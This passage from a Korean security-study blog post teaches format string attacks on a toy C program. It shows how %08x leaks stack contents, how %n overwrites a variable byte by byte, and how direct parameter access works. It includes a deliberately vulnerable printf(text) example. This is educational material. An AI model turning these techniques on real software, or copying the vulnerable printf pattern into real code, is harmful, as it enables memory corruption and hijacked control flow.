&lt;p&gt;ex05코드는 argv[1]로 입력받은 값과, 변수 x 정보(정수값, 16진수값, 변수주소)를 출력하는 코드이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실행 결과를 보면 argv로 넘겨준 “Hello world”를 출력하고 x변수의 값 1, 16진수값 0x1, 그리고 변수 x의 주소 0xff905e44를 출력하였다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/6.png&quot; alt=&quot;image-20190211145824684&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수의 스택을 살펴보면 위와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실제 디버거를 통해 살펴보면 위 사진과 같다. main함수가 실행되기 이전에 먼저 인자(argument)들이 먼저 스택에 push되고 복귀주소(RET)와 베이스 포인터가 push되고나서 main함수의 지역변수를 위한 공간이 확보된다.&lt;/p&gt;

&lt;p&gt;지역 변수가 push될 때, 배열 buf가 먼저 스택에 push되고, int형 변수 x가 push되는 것을 볼 수 있다. 이는 ex05코드상에서 buf 배열이 순차적으로 먼저 코딩되어 있기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;printf함수 역시 호출하기 전에 printf함수의 인자와 RET, EBP값이 push된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/9.png&quot; alt=&quot;image-20190211150747027&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위 그림은 main함수 내부에서 printf함수를 호출할 때 스택의 모습이다.&lt;/p&gt;

&lt;p&gt;여기서 printf함수의 인자에 들어가는 값은 buf배열이다. (ex05코드에서 buf를 인자로 사용하므로) &lt;strong&gt;이때, buf는 Format String으로 사용될 부분이고, 이는 실제 Format String이 들어가는 것이 아니라 Format String 포인터가 저장된다.(buf배열의 시작주소가 들어간다는 의미)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;디버거를 통해 살펴보면 좀더 정확하게 확인 할 수 있다.&lt;/p&gt;

&lt;p&gt;이와 같은 스택에 대한 작업이 완료되면 printf함수는 Format String을 파싱하고 실제 출력이 이루어지게된다.&lt;/p&gt;

&lt;p&gt;이때, &lt;strong&gt;&lt;u&gt;일반 문자들의 경우에는 일반 문자 그대로를 출력하고, 형식 지시자를 만나는 경우에는 해당 형식 지시자에 대한 내용을 스택에서 4Byte만큼 pop하여 출력하게 된다.(이 개념을 잊으면 안된다.🧐)&lt;/u&gt;&lt;/strong&gt;  이미 앞에서 언급한 것처럼 ==&lt;strong&gt;&lt;u&gt;이때 pop되는 것은 스택 상에서 Format String 포인터 다음에 위치한 내용&lt;/u&gt;&lt;/strong&gt;==이 된다. 무슨 말인고 하면…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/11.png&quot; alt=&quot;image-20190211151653110&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ex05 프로그램을 위와 같이 인자를 넘겨주면 printf함수는 “AAAA”를 출력하고 “%08x”를 만나면 형식지시자로 인식하고 출력을 위해 지정된 변수와는 상관없이 스택에서 4Byte만큼을 pop하여 출력하게 된다. &lt;strong&gt;따라서 스택의 정보를 손쉽게 확인 할 수 있다.&lt;/strong&gt; 위 그림처럼 &lt;code class=&quot;highlighter-rouge&quot;&gt;%08x&lt;/code&gt; 를 7번 입력하니 처음에 입력한 “AAAA” 문자열 값(0x41414141)이 출력되었다. &lt;strong&gt;이를 통해 printf함수 인자로 부터 24Byte만큼 떨어진 곳에 buf배열이 존재한다는 것을 알 수 있다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/12.png&quot; alt=&quot;image-20190213141117013&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 알아낸 정보를 바탕으로 스택에는 위와 같이 구성되어 있음을 알 수 있다.&lt;/p&gt;

&lt;h3 id=&quot;0x02-format-string-attack임의의-메모리-주소의-쓰기&quot;&gt;0x02. Format String Attack(임의의 메모리 주소의 쓰기)&lt;/h3&gt;

&lt;p&gt;앞서 printf함수의 특징을 살펴보았다. ex04 프로그램 예시에서 인자로 전달했던 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷인자 대신 &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 를 사용하면 어떻게 될까?&lt;/p&gt;

&lt;p&gt;간단히 예상해 볼 수 있는 것은 printf함수는 &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 포맷 인자를 만나면 스택의 내용을 pop하고 pop한 값을 주소로 이용하여 해당 주소에 지금까지 출력된 문자의 개수를 저장하게 된다. &lt;strong&gt;이때 만약 pop한 주소가 RET주소가 되면 프로그램의 흐름을 바꿀 수있다.&lt;/strong&gt; 이것이 &lt;strong&gt;Format String Attack의 주목적&lt;/strong&gt;이다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex06.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용법: %s &amp;lt;출력할 텍스트&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용자 입력을 출력하기 위한 좋은 방법:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// 알맞은 printf함수 사용법&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용자 입력을 출력위해 사용하면 안 되는 나쁜 방법:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// 잘못된 printf함수 사용법&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;c1&quot;&gt;//디버깅 출력&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*]test_val @ %p = %d, %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ex06 프로그램을 먼저 이해해보면, text배열을 1024 Byte만큼 선언하고, test_val변수가 static int형으로 선언되었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/13.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ex06 프로그램을 통해 &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 포맷인자를 이용하여 test_val(값 : -72)의 값을 바꿔보자.&lt;/p&gt;

&lt;p&gt;프로그램 실행 후 스택정보를 보면 printf인자와  text배열의 거리가 12Byte임을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/14.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;%08x 포맷인자의 크기는 8Byte이다.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;test_val 변수의 주소는 0x0804c02c이다. 따라서 buf배열의 test_val의 주소를 넣어주고 그뒤로 3번의 &lt;code class=&quot;highlighter-rouge&quot;&gt;%08x&lt;/code&gt;  지시자를 넣고 &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; 포맷인자를 넣으니 &lt;strong&gt;test_val 변수의 값이 31로 바뀌었다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;여기서 왜 test_val의 값이 바뀌었고, 왜 31이라는 값이 들어 갔는지 이해해야 된다.&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;%n지시자는 %n지시자 앞까지의 길이를 저장한다. 해당 길이는 총 31Byte가 되고 이 값을 저장하게 되는데, 이때 %08x지시자로 3번의 pop이 일어 났다. 그 이후 스택의 최상단에는 text배열이기 때문에 해당 스택에 있는 값을 주소를 이용한다. 따라서 text배열에는 0x080498e값이 들어있고 이 주소는 test_val변수의 주소이기 때문에 test_val변수의 값에 31이 저장되게 되는 것이다.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;따라서 test_val변수의 주소 대신 RET의 주소를 넣게 되면 프로그램의 흐름을 바꿀 수 있다. 하지만 &lt;strong&gt;또 다른 문제가 존재&lt;/strong&gt;한다. RET의 주소에 우리가 원하는 값으로 변경한다고 했을 때, 보통 특정한 코드를 수행하는 shellcode의 주소를 넣게된다.&lt;/p&gt;

&lt;p&gt;그 말은 즉, &lt;strong&gt;주소값&lt;/strong&gt;을 넣어야 된다는 점이다. 주소는 32bit 환경에서 16진수 8자리로 구성되어 진다. (위에서 test_val 변수의 주소 0x0804c02c이라는 주소처럼…) 이를 해결하기 위해 다음과 같은 방법을 이용하면 된다.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;메모리&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;2c&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;2d&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;2e&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;strong&gt;2f&lt;/strong&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;첫 번째 쓰기(0x0804c02c)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;aa&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;두 번째 쓰기(0x0804c02d)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;bb&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;세 번째 쓰기(0x0804c02e)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;cc&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;네 번째 쓰기(0x0804c02f)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;dd&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;00&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;결과&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;aa&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;bb&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;cc&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;dd&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;예를들어 test_val 변수에 0xddccbbaa 값을 넣고싶다고 하면, test_val 변수의 첫 번째 바이트는 0xaa, 그 이후는 0xbb, 0xcc, 0xdd값을 넣으면 된다.&lt;/p&gt;

&lt;p&gt;이때 0xaa는 10진수로 170, 0xbb(187), 0xcc(204), 0xdd(221) 이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/15.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 0xaa를 넣는다고 하면 %n 포맷인자 앞으로 170Byte의 길이가 있어야 하므로 위 그림처럼 입력하면 된다.&lt;/p&gt;

&lt;p&gt;이제 두번째 바이트를 써야 한다. 0xbb는 10진수로 187이므로 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷 인자가 필요하다. &lt;strong&gt;따라서 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷인자를 넣어야 하는데 ==&lt;u&gt;여기서 중요한점은 printf함수에서 포맷인자를 만나면 스택에서 4Byte만큼 pop한다는 점&lt;/u&gt;==이다. 잊지말자. 😉&lt;/strong&gt; &lt;strong&gt;현재 스택 맨 상단에는 text배열이므로 이부분이 %x에 들어가면 안된다. 따라서 쓸모없는 4Byte값을 중간에 넣어주어야한다.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;즉 위와 같이 1Byte씩 주소를 높여가면 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/16.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;먼저 0x0804c02c부터 1Byte씩 높여가면서 0x0804c02f까지 주소를 넣어주고, 각 주소에 넣을 값들을 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷인자를 이용하여 조절 해주면된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/17.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;같은 방식으로 0xddccbbaa를 완성하였다. 이렇게 값들을 넣다보면 한가지 궁금증이 생기가 된다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;0xaabbccdd를 만든다고 할 때, 두 번째 바이트(0xcc)는 첫 번재 바이트(0xdd)보다 작다. 이럴 경우는 어떻해야 할까?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;방법은 간단하다. 0xdd(221)를 만들고 나서 0xcc를 넣을 때 0x1cc(460)을 만들어서 1Byte인 0xcc만쓰여지게 하면 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/18.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;같은 방식으로 0xaabbccdd를 완성하였다.&lt;/p&gt;

&lt;h3 id=&quot;0x03-format-string-attack인자에-직접-접근&quot;&gt;0x03. Format String Attack(인자에 직접 접근)&lt;/h3&gt;

&lt;p&gt;앞서 &lt;code class=&quot;highlighter-rouge&quot;&gt;임의의 메모리 주소의 쓰기&lt;/code&gt; 방법은 각 포맷 인자에 해당하는 값을 찾으려고 여러 메모리 주소를 건너뛰어야 했다. 그래서 Format String의 맨 앞부분에 도달할 때 까지 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷 인자를 사용해야만 했다. 그리고 임의의 메모리 주소에 쓰려고 3개의 추가적인 4Byte 쓰레기 값(“EUNI”)을 넣어야 했다.&lt;/p&gt;

&lt;p&gt;이제는 직접 인자에 접근하는 방법을 알아보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex07.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;7th: %7$d, 4th: %4$05d &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//%n$d는 n번째 인자를 10진수로 출력한다.&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//%7$d이므로 7번째 인자(70)를 출력한다.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/19.png&quot; alt=&quot;image-20190212230236919&quot; /&gt;&lt;/p&gt;

&lt;p&gt;printf의 Foramt String을 살펴보면 &lt;code class=&quot;highlighter-rouge&quot;&gt;%7$d&lt;/code&gt; 와 &lt;code class=&quot;highlighter-rouge&quot;&gt;%4$05d&lt;/code&gt; 를 사용하여 총 8개의 인자 중 2개만 접근하였다. 이 방법을 이용하면 메모리에 직접 접근 할 수 있으므로 메모리 건너뛰기 위한 노력을 하지 않아도 된다. 위에서 보았던 ex06 예제를 다시 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//ex06.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
